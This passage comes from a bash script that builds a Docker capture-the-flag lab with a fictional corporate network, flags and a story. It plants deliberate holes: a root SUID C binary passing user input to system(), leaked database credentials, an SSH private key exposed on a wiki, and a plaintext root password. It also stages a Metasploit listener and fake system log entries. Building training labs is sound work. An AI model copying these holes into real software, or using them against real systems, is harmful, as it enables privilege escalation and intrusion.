spool ${TARGET_HOME}/.msf4/logs/handler_output.log
echo "[*] Generic listener started on \$LHOST_IP:4444 (check spool log)"
# Add commands to run on session: getsystem, sysinfo etc.
# set AutoRunScript multi_console_command -rc /path/to/autorun.rc
EOF
touch_random_time ${TARGET_HOME}/.msf4/targetcorp_handler.rc

set_owner ${TARGET_HOME}/scripts
set_owner ${TARGET_HOME}/.msf4

echo "[*] Adding more fake log entries (system)..."
# Simulate some user activity logs on HOST
echo "$(date '+%b %d %H:%M:%S') $(hostname) systemd[1]: Started User Manager for UID $(id -u $TARGET_USER)." >> /var/log/syslog
echo "$(date '+%b %d %H:%M:%S') $(hostname) CRON[$(shuf -i 10000-20000 -n 1)]: (root) CMD ( cd / && run-parts --report /etc/cron.hourly)" >> /var/log/auth.log
# Simulate Ghost using keepassxc
echo "$(date '+%b %d %H:%M:%S') $(hostname) keepassxc[$(shuf -i 2000-5000 -n 1)]: Database opened: ${TARGET_HOME}/Documents/ghost_secrets.kdbx" >> /var/log/syslog
# Simulate connection attempt log
echo "$(date '+%b %d %H:%M:%S') $(hostname) ssh[$(shuf -i 5000-9000 -n 1)]: connect to host ${REAL_SSH_JUMP_IP} port 22: Connection refused" >> /var/log/auth.log # Example fail before VPN
# Simulate Tor usage potentially logged by systemd/journald if service runs
# echo "$(date '+%b %d %H:%M:%S') $(hostname) systemd[1]: Starting Anonymizing overlay network for TCP..." >> /var/log/syslog


echo "[*] Cleaning up temp apt files..."
# Clean apt cache to save potential space if this were a real image build
apt-get clean > /dev/null

echo "[+] Host 'Ghostification' for user ${TARGET_USER} seems complete."
exit 0
EOF_POPULATE
)

# --- Helper Functions (Master Script) ---
check_dep() {
    # Use dpkg for checking package install status on Debian/Kali
    if ! dpkg -s "$1" &> /dev/null; then
        echo "[WARN] Dependency possibly missing: $1. Attempting to install..."
        # Ensure non-interactive frontend
        export DEBIAN_FRONTEND=noninteractive
        apt-get update > /dev/null && apt-get install -y --no-install-recommends "$1" > /dev/null || { echo "[FATAL] Failed to install $1. Aborting."; exit 1; }
    else
        echo "[INFO] Dependency checked: $1"
    fi
}

setup_docker_dirs() {
    echo "[*] Creating Docker project directory structure in ${PROJECT_DIR}..."
    # Clean slate for docker environment build files, NOT host home dir
    rm -rf "${PROJECT_DIR}"
    # Create structure for compose file, volumes, and Dockerfiles
    mkdir -p "${PROJECT_DIR}"/{vpn_data,director,ssh_jump_data/messages,web_dmz_data/html/dev-backup,portal_dmz_data/html,db_internal_data/mysql_init,db_internal_data/data,fileserv_data/shares/{Public,HR_Shared,ghost_data},dev_wiki_data/html/data/pages,dev_wiki_data/flags,qec_sim_data/{qec_control,payload,root,flags,config}}
    echo "[+] Docker directories created: ${PROJECT_DIR}"
}

generate_docker_keys_and_copy_ghost() {
    echo "[*] Generating Docker container specific keys and referencing ghost key..."
    # Generate Svc_deploy Key for Docker Volume
    echo "[*]   Generating svc_deploy key..."
    ssh-keygen -t rsa -b 4096 -f "${PROJECT_DIR}/dev_wiki_data/id_rsa_svc_deploy" -N "$SVC_DEPLOY_SSH_KEY_PASSPHRASE" -C "svc_deploy@docker-$(date +%s)"
    # Place public key for QEC Sim container build context
    cp "${PROJECT_DIR}/dev_wiki_data/id_rsa_svc_deploy.pub" "${PROJECT_DIR}/qec_sim_data/authorized_keys"
    chmod 600 "${PROJECT_DIR}/dev_wiki_data/id_rsa_svc_deploy"
    chmod 644 "${PROJECT_DIR}/dev_wiki_data/id_rsa_svc_deploy.pub"
    chmod 600 "${PROJECT_DIR}/qec_sim_data/authorized_keys"
    echo "[+]   svc_deploy keys generated and public key staged for qec-sim."

    # Copy Ghost's public key FOR the ssh-jump container build context
    echo "[*]   Staging ghost public key for ssh-jump..."
    if [[ -f "${GHOST_USER_HOME}/.ssh/id_ed25519.pub" ]]; then
        cp "${GHOST_USER_HOME}/.ssh/id_ed25519.pub" "${PROJECT_DIR}/ssh_jump_data/authorized_keys"
        chmod 600 "${PROJECT_DIR}/ssh_jump_data/authorized_keys"
         echo "[+]   Ghost public key staged for ssh-jump."
    else
        echo "[ERROR] Ghost user's public key (${GHOST_USER_HOME}/.ssh/id_ed25519.pub) not found after populate script ran! Cannot setup ssh-jump."
        exit 1
    fi
}

generate_vpn_config_docker() {
    echo "[*] Generating OpenVPN server and client configurations (using Docker)..."
    local VPN_DATA_HOST="${PROJECT_DIR}/vpn_data" # Path on host
    local VPN_DATA_CONT="/etc/openvpn"
    local OVPN_IMG="kylemanna/openvpn"
    # Place usable config directly in ghost's home for immediate use
    local CLIENT_OVPN_PATH="${GHOST_USER_HOME}/player-ghostframe.ovpn"

    # Make sure the vpn_data dir exists
    mkdir -p "$VPN_DATA_HOST"

    echo "[*]   Generating server config (if needed)..."
    if [[ ! -f "${VPN_DATA_HOST}/openvpn.conf" ]]; then
      # Run docker with --user to avoid root-owned files if possible, though kylemanna image might handle it
      docker run --rm -v "${VPN_DATA_HOST}:${VPN_DATA_CONT}" $OVPN_IMG ovpn_genconfig \
        -u udp://$VPN_SERVER_FQDN \
        -N \
        -p "route ${DMZ_SUBNET}" \
        -p "route ${INTERNAL1_SUBNET}" \
        -p "route ${INTERNAL2_HSZ_SUBNET}" \
        -s ${VPN_SUBNET} \
        -d # Add basic DNS push options
        # Consider pushing a specific internal DNS server IP if you run one (e.g., dnsmasq container)
        # -p "dhcp-option DNS <INTERNAL_DNS_IP>"
        # Without internal DNS, user must rely on IPs or manually edit /etc/hosts on Kali machine
    else
      echo "[*]   Server config exists, skipping generation."
    fi

    echo "[*]   Initializing PKI (if needed)..."
    if [[ ! -d "${VPN_DATA_HOST}/pki" ]]; then
        docker run --rm -v "${VPN_DATA_HOST}:${VPN_DATA_CONT}" -it $OVPN_IMG ovpn_initpki nopass
    else
         echo "[*]   PKI exists, skipping initialization."
    fi

    echo "[*]   Generating client config for '${GHOST_USER}' (if needed)..."
    if [[ ! -f "${VPN_DATA_HOST}/pki/issued/${GHOST_USER}.crt" ]]; then
        # Ensure the common name matches the username exactly if needed later
        docker run --rm -v "${VPN_DATA_HOST}:${VPN_DATA_CONT}" -it $OVPN_IMG easyrsa build-client-full $GHOST_USER nopass
    else
         echo "[*]   Client config for ${GHOST_USER} exists, skipping generation."
    fi

    echo "[*]   Retrieving client config..."
    docker run --rm -v "${VPN_DATA_HOST}:${VPN_DATA_CONT}" $OVPN_IMG ovpn_getclient $GHOST_USER > "${CLIENT_OVPN_PATH}"

    if [[ -s "${CLIENT_OVPN_PATH}" ]]; then # Check if file is not empty
        # Set ownership/permissions for the .ovpn file in ghost's home
        chown ${GHOST_USER}:${GHOST_USER} "${CLIENT_OVPN_PATH}"
        chmod 600 "${CLIENT_OVPN_PATH}" # Restrictive permissions usually good for key files
        echo "[+] VPN configurations generated. Client config placed at: ${CLIENT_OVPN_PATH}"
    else
        echo "[ERROR] Failed to generate or retrieve VPN client config! Check Docker & VPN setup steps."
        # Optionally remove empty file: rm -f "${CLIENT_OVPN_PATH}"
        exit 1
    fi
}

populate_docker_volumes_master() {
    echo "[*] Populating Docker volumes with flags and configurations..."

    # ssh-jump
    echo "${FLAG_JUMPBOX}" > "${PROJECT_DIR}/ssh_jump_data/flag.txt"
    # Simple check_connections script
    cat << EOF > "${PROJECT_DIR}/ssh_jump_data/check_connections.sh"
#!/bin/bash
echo "--- Active TCP/UDP Listeners ---"
ss -tulnp
echo ""
echo "--- Established Connections ---"
ss -tnp
EOF
    chmod +x "${PROJECT_DIR}/ssh_jump_data/check_connections.sh"

    # web-dmz
    echo "[*]   Populating web-dmz..."
    # Create basic index
    echo "<html><body><h1>TargetCorp</h1><p>Welcome.</p><a href='https://${TARGET_WEB_PORTAL:-portal.targetcorp.com}'>Client Login</a></body></html>" > "${PROJECT_DIR}/web_dmz_data/html/index.html"
    # DB creds leak
    echo "<?php // Config Backup - DO NOT DEPLOY \ndefine('DB_USER', '${DB_WEB_USER}'); \ndefine('DB_PASSWORD', '${DB_WEB_PASS}'); \ndefine('DB_HOST', 'db.targetcorp.local'); // ${DB_INT1_IP} \n?>" > "${PROJECT_DIR}/web_dmz_data/html/dev-backup/db_config.php.bak"
    # Robots.txt
    echo "User-agent: *" > "${PROJECT_DIR}/web_dmz_data/html/robots.txt"
    echo "Allow: /" >> "${PROJECT_DIR}/web_dmz_data/html/robots.txt"
    echo "Disallow: /dev-backup/" >> "${PROJECT_DIR}/web_dmz_data/html/robots.txt"
    # Flag accessible within container if needed
    echo "${FLAG_WEBCREDS}" > "${PROJECT_DIR}/web_dmz_data/flag_webdmz.txt"

    # portal-dmz (Copy vulnerable PHP code)
    echo "[*]   Populating portal-dmz (vulnerable PHP)..."
    # Assuming vulnerable code is stored alongside the master script
    local SCRIPT_DIR=$(dirname "$(readlink -f "$0")")
    if [[ -d "${SCRIPT_DIR}/resources/portal" ]]; then
        cp "${SCRIPT_DIR}/resources/portal/"*.php "${PROJECT_DIR}/portal_dmz_data/html/" || echo "[WARN] Failed to copy portal PHP files from resources dir."
    else
        # Create dummy files if resources don't exist
        echo "<?php echo 'Portal Index - TODO: Vulnerable Login'; ?>" > "${PROJECT_DIR}/portal_dmz_data/html/index.php"
        echo "<?php echo 'Portal Dashboard - TODO: Show Sensitive Info'; ?>" > "${PROJECT_DIR}/portal_dmz_data/html/dashboard.php"
        echo "<?php // Logout ?>" > "${PROJECT_DIR}/portal_dmz_data/html/logout.php"
        echo "[WARN] Portal PHP resource directory not found. Created dummy PHP files."
    fi
    # Add internal flag file
    echo "${FLAG_PORTALSQLI}" > "${PROJECT_DIR}/portal_dmz_data/flag_portal.txt"
    echo "${FLAG_PORTALHTML}" >> "${PROJECT_DIR}/portal_dmz_data/flag_portal.txt" # Include HTML source flag too

    # db-internal (Write init.sql)
    echo "[*]   Writing DB init script..."
     cat << EOF > "${PROJECT_DIR}/db_internal_data/mysql_init/init.sql"
-- Create Database and Tables
CREATE DATABASE IF NOT EXISTS targetcorp_db;
USE targetcorp_db;

CREATE TABLE IF NOT EXISTS portal_users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(50) NOT NULL UNIQUE,
    password_hash VARCHAR(255), -- Store hashes properly in a real scenario
    full_name VARCHAR(100),
    job_title VARCHAR(100),
    email VARCHAR(100)
);

CREATE TABLE IF NOT EXISTS projects (
    id INT PRIMARY KEY,
    name VARCHAR(100),
    description TEXT,
    status VARCHAR(50)
);

CREATE TABLE IF NOT EXISTS ghost_activity_log (
    id INT AUTO_INCREMENT PRIMARY KEY,
    ts TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    source_ip VARCHAR(50),
    user VARCHAR(50),
    action TEXT
);

CREATE TABLE IF NOT EXISTS internal_flags (
    flag_id VARCHAR(100) PRIMARY KEY,
    description VARCHAR(255)
);

-- Insert Data
-- Use realistic hashes if possible, otherwise placeholders
INSERT INTO portal_users (username, password_hash, full_name, job_title, email) VALUES
('admin', '\$2y\$10\$...', 'Alice Manager', 'IT Manager', '${ADMIN_EMAIL}'), -- Example admin
('bob.d', '\$2y\$10\$...', 'Bob Developer', 'Software Engineer', 'bob.d@${TARGET_DOMAIN_EXTERNAL}'),
('testuser', '\$2y\$10\$...', 'Test User', 'QA Tester', 'test@${TARGET_DOMAIN_EXTERNAL}')
ON DUPLICATE KEY UPDATE username=username; -- Avoid errors on rerun

INSERT INTO projects (id, name, description, status) VALUES
(1, 'Project Griffin', 'Advanced Simulation Core. Primary documentation located on dev-wiki (${DEVWIKI_IP}). Access restricted.', 'Active Development'),
(2, 'Website Redesign', 'Update corporate website (Phase 1 Complete)', 'Archived'),
(3, 'Internal Portal Upgrade', 'Enhance employee portal (On Hold)', 'Backlog')
ON DUPLICATE KEY UPDATE name=name;

-- Simulate Ghost's activity and detection
INSERT INTO ghost_activity_log (source_ip, user, action) VALUES
('192.168.255.10', '0xGhost', 'Connected via VPN'),
('192.168.255.10', '0xGhost', 'Accessed ssh-jump (${SSH_JUMP_DMZ_IP})'),
('192.168.255.10', '0xGhost', 'Accessed fileserv (${FILESREV_IP}) via SMB'),
('192.168.255.10', '0xGhost', 'Queried DB for project details'),
('192.168.255.10', '0xGhost', 'Accessed dev-wiki (${DEVWIKI_IP})'),
('192.168.255.10', '0xGhost', 'Attempted connection to qec-sim (${QECSIM_IP})'),
('10.0.1.5', 'INTERNAL_SEC', 'Scan detected from potential threat actor 192.168.255.10 targeting HSZ.'),
('10.0.1.5', 'INTERNAL_SEC', 'Deployed countermeasures, session terminated.'); -- Narrative justification for stop

-- Insert DB Flag
INSERT INTO internal_flags (flag_id, description) VALUES
('${FLAG_DBCONNECT}', 'Flag found in database internal_flags table')
ON DUPLICATE KEY UPDATE flag_id=flag_id;

-- Create Web User for Portal
CREATE USER IF NOT EXISTS '${DB_WEB_USER}'@'%' IDENTIFIED BY '${DB_WEB_PASS}';
-- Grant minimal necessary permissions
GRANT SELECT ON targetcorp_db.portal_users TO '${DB_WEB_USER}'@'%';
GRANT SELECT ON targetcorp_db.projects TO '${DB_WEB_USER}'@'%';
GRANT SELECT ON targetcorp_db.ghost_activity_log TO '${DB_WEB_USER}'@'%';
-- Grant select on flags table if portal needs to display it, or keep separate
-- GRANT SELECT ON targetcorp_db.internal_flags TO '${DB_WEB_USER}'@'%';
FLUSH PRIVILEGES;
EOF

    # fileserv (Populate shares)
    echo "[*]   Populating fileserv shares..."
    echo "TargetCorp Public Files. Welcome." > "${PROJECT_DIR}/fileserv_data/shares/Public/welcome.txt"
    echo "Placeholder network map. Likely outdated." > "${PROJECT_DIR}/fileserv_data/shares/Public/network_map_v1.drawio"
    echo "Employee Data - Confidential." > "${PROJECT_DIR}/fileserv_data/shares/HR_Shared/employee_roster.xlsx"
    # Ghost data with creds and flag
    cat << EOF > "${PROJECT_DIR}/fileserv_data/shares/ghost_data/research_fragment.txt"
Dev Wiki seems to be key. URL: http://${DEVWIKI_IP} or https://${DEVWIKI_IP} ?
Found possible creds for it in an old commit log: user=dev_user pass=WikiPa55!
Need to verify access. Contains Project Griffin details hopefully.
FLAG for finding this: ${FLAG_FILESERVCREDS}
EOF

    # dev-wiki (Populate wiki pages and flags)
    echo "[*]   Populating dev-wiki content..."
    # Project Griffin Page
    cat << EOF > "${PROJECT_DIR}/dev_wiki_data/html/data/pages/project_griffin.txt"
====== Project Griffin ======

**Status:** Active Development
**Lead:** Dr. Evelyn Reed
**Location:** Simulation hosted on \`qec-sim.targetcorp.internal\` (${QECSIM_IP}) in High Security Zone (HSZ - ${INTERNAL2_HSZ_SUBNET}). Network access is heavily restricted.

**Description:**
Project Griffin is TargetCorp's next-generation Advanced Simulation Core, utilizing proprietary AI models for complex scenario modeling. Focus areas include predictive analytics and automated response generation. Access requires specific clearance and SSH key authentication to the QEC-Sim server.

**Deployment:** See [[deployment_procedures]] page for SSH keys and steps.

**Internal Flag:** ${FLAG_WIKIACCESS}
EOF
    # Deployment Page with Key
    cat << EOF > "${PROJECT_DIR}/dev_wiki_data/html/data/pages/deployment_procedures.txt"
====== Deployment Procedures (QEC-Sim) ======

**Target Server:** \`qec-sim.targetcorp.internal\` (${QECSIM_IP})
**User:** \`svc_deploy\`

**Steps:**
1. Ensure VPN access to internal network.
2. Use the following SSH private key for authentication. **Ensure permissions are 600.**
3. Connect: \`ssh -i /path/to/svc_deploy_key svc_deploy@${QECSIM_IP}\`

**SSH Private Key (svc_deploy):**
-----BEGIN RSA PRIVATE KEY-----
$(cat "${PROJECT_DIR}/dev_wiki_data/id_rsa_svc_deploy")
-----END RSA PRIVATE KEY-----

**NOTE:** This key should be stored securely. Do not commit to public repos. Remove from here ASAP!

**Trigger Flag:** ${FLAG_SVCKEY} (Submitting this should open firewall access from jumpbox)
EOF
    # Copy key file to html dir as well, simulating accidental exposure
    cp "${PROJECT_DIR}/dev_wiki_data/id_rsa_svc_deploy" "${PROJECT_DIR}/dev_wiki_data/html/id_rsa_svc_deploy.key.backup"

    # qec-sim (SUID binary code, encrypted payload, warning note, flags)
    echo "[*]   Populating qec-sim..."
    # SUID Binary C code
    cat << 'EOF' > "${PROJECT_DIR}/qec_sim_data/qec_control/qec_control.c"
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main(int argc, char **argv) {
    // Vulnerability 1: Command Injection via argument
    // Vulnerability 2: Reads arbitrary file if path is provided as second arg? (Not implemented here for simplicity)
    // Vulnerability 3: Hardcoded password check? (Not implemented here)

    printf("Quantum Entanglement Core Control v0.1 (Running as EUID: %d)\n", geteuid());
    setuid(0); // Set effective UID to root

    if (argc > 1) {
        printf("Executing command: %s\n", argv[1]);
        // Basic filter attempt (easily bypassable)
        if (strstr(argv[1], ";") || strstr(argv[1], "&") || strstr(argv[1], "|") || strstr(argv[1], "`")) {
           printf("Error: Potentially dangerous characters detected in command.\n");
           return 1;
        }
        system(argv[1]); // Vulnerable command execution
    } else {
        printf("Usage: %s <command_to_execute_as_root>\n", argv[0]);
        printf("Example: %s id\n", argv[0]);
    }
    return 0;
}
EOF
    # Encrypted Payload
    echo "[*]     Encrypting final payload..."
    # Generate slightly larger payload text
    PAYLOAD_TEXT=$(cat << EOF_PAYLOAD
#### 0xGhost Final Report - Project Chimera/Griffin ####
Date: (Approximate date Ghost disappeared)
Status: CRITICAL

Project Griffin is not merely a simulation. It is a functional, autonomous cyberweapon core being developed by TargetCorp.
Capabilities observed/inferred:
- Autonomous vulnerability discovery (network scanning, fuzzing capabilities).
- Payload generation based on discovered vulns.
- Self-propagation logic detected in simulation logs.
- Potential for zero-day generation based on advanced model training.

TargetCorp Intentions: Unknown, but logs suggest potential sale to state actor or private military contractor. Internal memo referenced "Phase Delta deployment". This cannot be allowed to happen.

Ethical Concerns: Catastrophic potential for unintended escalation or misuse. AI control over offensive cyber capabilities is reckless.

Action: Attempting secure exfiltration of core technical data and this report. If I go dark, assume compromise. Nu11Division must act.

Final Flag: ${FLAG_FINAL}
EOF_PAYLOAD
)
    echo "$PAYLOAD_TEXT" > /tmp/final_package_$$.txt
    if openssl enc -aes-256-cbc -pbkdf2 -salt -out "${PROJECT_DIR}/qec_sim_data/payload/final_package.enc" -in /tmp/final_package_$$.txt -k "$DELTA_CHARLIE_KEY"; then
      echo "[+]     Final payload encrypted."
    else
      echo "[ERROR]   Failed to encrypt final payload!"
      rm -f /tmp/final_package_$$.txt
      exit 1
    fi
    rm /tmp/final_package_$$.txt

    # Warning Note from Canary
    cat << EOF > "${PROJECT_DIR}/qec_sim_data/root/ghost_warning.txt"
Ghost -

They know. Internal security flagged your access attempts here. I masked initial logs but they are actively hunting now. Abort mission.

The final payload package is in \`/opt/qec/payload/final_package.enc\`. Decryption key uses our first agreed secure signal ('**DeltaCharlie**').

Get it and **GET OUT**. I cannot cover for you further. They are monitoring all egress points. Good luck.

-C

Flag here: ${FLAG_QECROOT}
EOF
    # Flags for qec-sim volume
    echo "${FLAG_PAYLOADFOUND}" > "${PROJECT_DIR}/qec_sim_data/flags/flag_payload.txt"

    # Optional: Add dummy config file for alternate privesc path
    echo "<config><root_password>SuperSecureRootPass1!</root_password></config>" > "${PROJECT_DIR}/qec_sim_data/config/config.xml"

    echo "[+] Docker volumes populated."
}

write_dockerfiles_master() {
    echo "[*] Writing Dockerfiles..."
    # Write Director Dockerfile
     cat << EOF > "${PROJECT_DIR}/director/Dockerfile"
FROM python:3.9-slim
WORKDIR /app
RUN pip install --no-cache-dir docker # Ensure docker library is installed
COPY director.py flags.txt ./
# Ensure script is executable if needed, though python command runs it directly
# CMD ["python", "-u", "director.py"] # -u for unbuffered output
CMD ["python", "director.py"]
EOF
    # Write QEC Sim Dockerfile
     cat << EOF > "${PROJECT_DIR}/qec_sim_data/Dockerfile"
FROM ubuntu:20.04
# Install necessary packages
RUN apt-get update && apt-get install -y --no-install-recommends \
    openssh-server build-essential sudo net-tools \
    && rm -rf /var/lib/apt/lists/*

# Create svc_deploy user, setup SSH directory and permissions
RUN useradd -m -s /bin/bash svc_deploy \
    && mkdir -p /home/svc_deploy/.ssh \
    && chmod 700 /home/svc_deploy/.ssh \
    && chown -R svc_deploy:svc_deploy /home/svc_deploy

# Copy authorized keys for svc_deploy
COPY --chown=svc_deploy:svc_deploy ./authorized_keys /home/svc_deploy/.ssh/authorized_keys
RUN chmod 600 /home/svc_deploy/.ssh/authorized_keys

# Copy and configure SSHD
COPY sshd_config /etc/ssh/sshd_config
RUN chmod 644 /etc/ssh/sshd_config

# Compile the vulnerable SUID binary
COPY qec_control/qec_control.c /tmp/qec_control.c
RUN gcc /tmp/qec_control.c -o /usr/local/bin/qec_control \
    && chmod 4755 /usr/local/bin/qec_control \
    && rm /tmp/qec_control.c

# Create directories for payload, config, flags, root files
RUN mkdir -p /opt/qec/payload /opt/qec/config /flags_internal /root \
    && chown -R root:root /root

# Copy payload, root warning, flags, optional config
COPY payload/* /opt/qec/payload/
COPY flags/* /flags_internal/
COPY root/* /root/
# COPY config/* /opt/qec/config/ # Mount point for config.xml if used

# Ensure SSH keys are generated for the host container
RUN ssh-keygen -A

# Expose SSH port
EXPOSE 22

# Start SSH Daemon
CMD ["/usr/sbin/sshd", "-D", "-e"] # -e logs to stderr for docker logs
EOF
    # Write ssh-jump Dockerfile
    cat << EOF > "${PROJECT_DIR}/ssh_jump_data/Dockerfile"
FROM ubuntu:20.04
# Install necessary packages
RUN apt-get update && apt-get install -y --no-install-recommends \
    openssh-server sudo tcpdump vim net-tools curl dnsutils netcat \
    && rm -rf /var/lib/apt/lists/*

# Create ghost user, setup SSH, sudo access for tcpdump
RUN useradd -m -s /bin/bash ghost \
    && usermod -aG sudo ghost \
    && mkdir -p /home/ghost/.ssh /home/ghost/scripts /home/ghost/messages \
    && chmod 700 /home/ghost/.ssh \
    && chown -R ghost:ghost /home/ghost

# Copy authorized keys for ghost
COPY --chown=ghost:ghost ./authorized_keys /home/ghost/.ssh/authorized_keys
RUN chmod 600 /home/ghost/.ssh/authorized_keys

# Grant specific sudo permission for tcpdump on likely internal interface (eth0 or eth1?)
# Adjust interface name if Docker assigns differently
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/sbin/tcpdump -i eth1 port 3306' >> /etc/sudoers
RUN echo '%sudo ALL=(ALL) NOPASSWD: /usr/sbin/tcpdump -i eth0 port 3306' >> /etc/sudoers

# Copy custom SSHD config
COPY sshd_config /etc/ssh/sshd_config
RUN chmod 644 /etc/ssh/sshd_config

# Set ghost user password if needed (e.g., if key fails for player)
RUN echo 'ghost:${GHOST_SAMBA_PASS}' | chpasswd

# Copy check_connections script
COPY check_connections.sh /home/ghost/scripts/
RUN chmod +x /home/ghost/scripts/check_connections.sh && chown ghost:ghost /home/ghost/scripts/check_connections.sh

# Ensure SSH keys are generated for the host container
RUN ssh-keygen -A

# Expose SSH port
EXPOSE 22

# Start SSH Daemon
CMD ["/usr/sbin/sshd", "-D", "-e"]
EOF
    # Create dummy sshd_config files if needed by Dockerfiles, ensure basic security
    if [[ ! -f "${PROJECT_DIR}/ssh_jump_data/sshd_config" ]]; then
        cat << EOF_SSHD > "${PROJECT_DIR}/ssh_jump_data/sshd_config"
Port 22
PermitRootLogin no
PasswordAuthentication yes # Allow password login as ghost user set in Dockerfile
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
EOF_SSHD
    fi
    if [[ ! -f "${PROJECT_DIR}/qec_sim_data/sshd_config" ]]; then
         cat << EOF_SSHD > "${PROJECT_DIR}/qec_sim_data/sshd_config"
Port 22
PermitRootLogin no
PasswordAuthentication no # Key only for svc_deploy
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
EOF_SSHD
    fi
    # Create dummy PHP Dockerfiles if not providing real app code and resources dir isn't present
    if [[ ! -f "${PROJECT_DIR}/portal_dmz_data/Dockerfile" ]]; then
      if [[ ! -d "${SCRIPT_DIR}/resources/portal" ]]; then
          echo "[WARN] Portal resources missing, creating basic PHP Dockerfile."
          cat << EOF > "${PROJECT_DIR}/portal_dmz_data/Dockerfile"
FROM php:7.4-apache
COPY html/ /var/www/html/
RUN docker-php-ext-install mysqli && docker-php-ext-enable mysqli
EXPOSE 80
EOF
      else
           # Assume resources dir means we need to build from it
           cat << EOF > "${PROJECT_DIR}/portal_dmz_data/Dockerfile"
FROM php:7.4-apache
COPY html/ /var/www/html/ # Copy provided PHP files
RUN docker-php-ext-install mysqli && docker-php-ext-enable mysqli
# Add other extensions if needed by copied code
EXPOSE 80
EOF
      fi
    fi
    if [[ ! -f "${PROJECT_DIR}/dev_wiki_data/Dockerfile" ]]; then
      echo "[WARN] Dev Wiki Dockerfile missing, creating basic PHP Dockerfile."
      cat << EOF > "${PROJECT_DIR}/dev_wiki_data/Dockerfile"
FROM php:7.4-apache
# Install wiki software here (e.g., Dokuwiki) or just serve files
COPY html/ /var/www/html/
RUN chown -R www-data:www-data /var/www/html/data # Ensure permissions if wiki needs writes
EXPOSE 80
EOF
    fi

    echo "[+] Dockerfiles written."
}

write_director_script_master() {
echo "[*] Writing Director script..."
# Use the content from the previous `setup_ghostframe_environment.sh`'s function
# Ensure FLAG variables are correctly substituted and network names match compose
cat << EOF > "${PROJECT_DIR}/director/director.py"
import socketserver
import threading
import os
import time
import docker # Needs docker library installed (pip install docker)
import logging

# --- Configuration ---
HOST, PORT = "0.0.0.0", ${DIRECTOR_PORT}
FLAGS_FILE = "/app/flags.txt"
DOCKER_SOCK = "/var/run/docker.sock"
MESSAGES_BASE = "/app/target_mounts" # Mounted volumes for targets
PROJECT_NAME = os.environ.get("PROJECT_DIR_NAME", "project-ghostframe") # Get project name prefix if provided

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] [%(levelname)s] %(message)s')
logger = logging.getLogger("Director")

# --- Docker Client Setup ---
DOCKER_CLIENT = None
try:
    if os.path.exists(DOCKER_SOCK):
        DOCKER_CLIENT = docker.from_env()
        DOCKER_CLIENT.ping() # Test connection
        logger.info("Docker client initialized successfully.")
    else:
        logger.warning("Docker socket not found.")
except Exception as e:
    logger.error(f"Failed to initialize Docker client: {e}")
    DOCKER_CLIENT = None


# --- Flag Constants (Must match master script) ---
FLAG_SVCKEY = "${FLAG_SVCKEY}"
FLAG_FINAL = "${FLAG_FINAL}"
# Add other flags if specific checks needed beyond existence

# --- Actions ---
ACTION_FLAGS = {
    FLAG_SVCKEY: "open_hsz_firewall",
    FLAG_FINAL: "game_over_message"
}
SUBMITTED_FLAGS = set() # Track submitted flags globally


def get_container_name(service_name):
    """Helper to get the real container name using compose project prefix"""
    # This is fragile, relies on default compose naming convention
    # A better way might be labels, but this is simpler for now
    # Try explicit name first, then default compose name
    explicit_name = service_name # Assume container_name was set in compose
    default_compose_name = f"{PROJECT_NAME}_{service_name}_1" # Default V1 compose name
    legacy_compose_name = f"{PROJECT_NAME}-{service_name}-1" # Default V2 compose name

    if not DOCKER_CLIENT: return None
    try:
        DOCKER_CLIENT.containers.get(explicit_name)
        return explicit_name
    except docker.errors.NotFound:
         logger.debug(f"Explicit container name '{explicit_name}' not found.")
    try:
        DOCKER_CLIENT.containers.get(default_compose_name)
        return default_compose_name
    except docker.errors.NotFound:
         logger.debug(f"Default V1 compose name '{default_compose_name}' not found.")
    try:
        DOCKER_CLIENT.containers.get(legacy_compose_name)
        return legacy_compose_name
    except docker.errors.NotFound:
        logger.error(f"Could not find container for service '{service_name}' using likely names.")
        return None


def open_hsz_firewall():
    target_network_name = f"{PROJECT_NAME}_internal_net2_hsz" # Base on project dir name
    ssh_jump_service_name = "ssh-jump" # Service name from compose
    message_file = os.path.join(MESSAGES_BASE, "ssh_jump", "zf_msg_03.txt")

    logger.info(f"ACTION: Received flag {FLAG_SVCKEY}. Attempting to open HSZ firewall.")
    if not DOCKER_CLIENT:
        logger.error("Docker client not available for firewall action.")
        return

    ssh_jump_container_name = get_container_name(ssh_jump_service_name)
    if not ssh_jump_container_name: return

    try:
        network = DOCKER_CLIENT.networks.get(target_network_name)
        container = DOCKER_CLIENT.containers.get(ssh_jump_container_name)
        container.reload() # Refresh attributes

        # Check if already connected
        is_connected = target_network_name in container.attrs.get('NetworkSettings', {}).get('Networks', {})

        if not is_connected:
            logger.info(f"Connecting container '{ssh_jump_container_name}' to network '{target_network_name}'...")
            network.connect(container)
            logger.info(f"Container '{ssh_jump_container_name}' connected to HSZ network.")
        else:
            logger.info(f"Container '{ssh_jump_container_name}' already connected to '{target_network_name}'.")

        # Drop message file into the mounted volume
        message = f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] ZF Msg: Key verified. Opening pinhole from jumpbox ({SSH_JUMP_DMZ_IP}) to qec-sim ({QECSIM_IP}) on port 22. Proceed with caution. Do not linger. -ZF"
        try:
            os.makedirs(os.path.dirname(message_file), exist_ok=True)
            with open(message_file, "w") as f:
                f.write(message + "\n")
            logger.info(f"Message dropped into ssh-jump volume: {message_file}")
        except Exception as e:
            logger.error(f"Could not write message file {message_file}: {e}")

    except docker.errors.NotFound:
        logger.error(f"Docker Network ('{target_network_name}') or Container ('{ssh_jump_container_name}') not found.")
    except docker.errors.APIError as e:
        logger.error(f"Docker API error during network connect: {e}")
    except Exception as e:
        logger.error(f"Unexpected error executing firewall action: {e}")

def game_over_message():
    message_file = os.path.join(MESSAGES_BASE, "ssh_jump", "zer0frame_final.txt")
    logger.info(f"ACTION: Received final flag {FLAG_FINAL}. Dropping final message.")

    message = f"""
[{time.strftime('%Y-%m-%d %H:%M:%S')}] ** TRANSMISSION FROM ZER0FRAME **

